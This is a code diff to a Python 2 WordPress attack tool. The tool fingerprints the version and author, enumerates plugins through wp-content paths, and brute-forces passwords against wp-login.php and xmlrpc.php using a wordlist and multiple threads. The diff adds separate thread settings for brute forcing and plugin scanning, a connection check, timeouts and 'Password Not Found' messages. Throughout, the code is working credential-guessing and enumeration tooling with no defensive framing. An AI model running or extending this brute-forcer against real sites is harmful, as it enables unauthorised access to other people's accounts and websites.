@@ -2,12 +2,13 @@ from __future__ import division
 import requests
 import re
 import threading
-from multiprocessing import Queue, Process
+from Queue import Queue
 from multiprocessing.sharedctypes import Value
 import time 
 import os
 import sys
 from init import *
+from logging import warning
 
 class WordPress_Scan():
 	def __init__(self,dict):
@@ -15,7 +16,15 @@ class WordPress_Scan():
 		self.url =  "http://{0}".format(TempUrl)
 		self.username = dict['uname']
 		self.pwdfile = dict['pwd']
-		self.Mixthread = dict['threads']
+		self.Mixthread = dict['bthreads']
+		self.Pthread = dict['pthreads']
+
+	def Connect_Test(self): 
+		try:
+			requests.get(self.url,timeout = 10)
+		except:
+			print "Connect Fail!"
+			exit()
 
 	def VersionScan(self):
 		self.Version_Path =  self.url+'/readme.html'
@@ -58,8 +67,9 @@ class WordPress_Scan():
 				print "Wordpress Author maybe:\33[31m%s\33[0m" %Author_list[0]
 
 	def LoadPlugin(self):
+		self.mutex = threading.Lock()
 		print "\33[33mStart Plugin scan,please wait...\33[0m"
-		self.count = 0;
+		self.TestNum = 0;
 		PluginThread=[]
 		ExistList = []
 		self.flag = 0
@@ -72,11 +82,11 @@ class WordPress_Scan():
 				PluginList = line.strip()
 				self.PluginQueue.put(PluginList)
 			file.close()
-			self.PluginQueue.cancel_join_thread() 
+			#self.PluginQueue.cancel_join_thread() 
 		else:
 			print " file does not exist!"
 		start = time.time()
-		for count in range(5):
+		for count in range(self.Pthread):
 			t = threading.Thread(target = self.PluginScan,args = (linecount,ExistList))
 			t.setDaemon(True)
 			t.start()
@@ -95,16 +105,20 @@ class WordPress_Scan():
 			Plugin_Path =  self.url
 			try:
 				PluginDir = self.PluginQueue.get(timeout = 1)
-			except:
-				break
+				self.mutex.acquire()
+				self.TestNum+=1
+				self.mutex.release()
+			except Exception,ex:
+				#warning(ex)
+				pass				
 			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
-			Plugin_re = requests.get(Plugin_Path,headers = HEADERS,timeout = 3)
+			Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
 			if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
 				ExistList.append(PluginDir)
 			Plugin_Path =  self.url
-			self.count+=1
-			sys.stdout.write('Current full schedule:'+str(str(self.count)+'/'+str(linecount))+"\r")
+			sys.stdout.write('Current full schedule:'+str(str(self.TestNum)+'/'+str(linecount))+"\r")
 			sys.stdout.flush()
+
 
 	def Brute_Force(self):
 		self.Brute_path1 = self.url+'/wp-login.php'
@@ -139,6 +153,9 @@ class WordPress_Scan():
 			PwdThread.append(th)
 		for i in PwdThread:
 			i.join()
+		if self.KeyFlag.value ==0:
+			print ""
+			print "Password Not Found!!!"
 
 
 	def Login_Brute_Force(self):
@@ -146,7 +163,7 @@ class WordPress_Scan():
 			if(self.KeyFlag.value):
 				break
 			if(not self.PwdQueue.empty()):
-				Payload = self.PwdQueue.get()
+				Payload = self.PwdQueue.get(timeout = 1)
 			else:
 				break
 			Path1re = requests.post(self.Brute_path1,data = Payload,headers = HEADERS)
@@ -166,7 +183,7 @@ class WordPress_Scan():
 				payload = {'log':self.username,'pwd':pwd,'redirect_to':''}
 				self.PwdQueue.put(payload)
 		file.close()
-		self.PwdQueue.cancel_join_thread()
+		#self.PwdQueue.cancel_join_thread()
 
 	def Xmlrpc_Load_Brute_Force(self):
 		PwdThread = []
@@ -179,6 +196,9 @@ class WordPress_Scan():
 			PwdThread.append(th)
 		for i in PwdThread:
 			i.join()
+		if self.KeyFlag.value ==0:
+			print ""
+			print "Password Not Found!!!"
 
 	def XmlrpcReadPwdFile(self):
 		file = open(self.pwdfile)
@@ -206,8 +226,8 @@ class WordPress_Scan():
   			if(self.KeyFlag.value):
 				break
 			if(not self.PwdQueue.empty()):
-				Payload = self.PwdQueue.get()
-				pwd = self.TruePwd.get()
+				Payload = self.PwdQueue.get(timeout = 1)
+				pwd = self.TruePwd.get(timeout = 1)
 			else:
 				break
 			Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS)
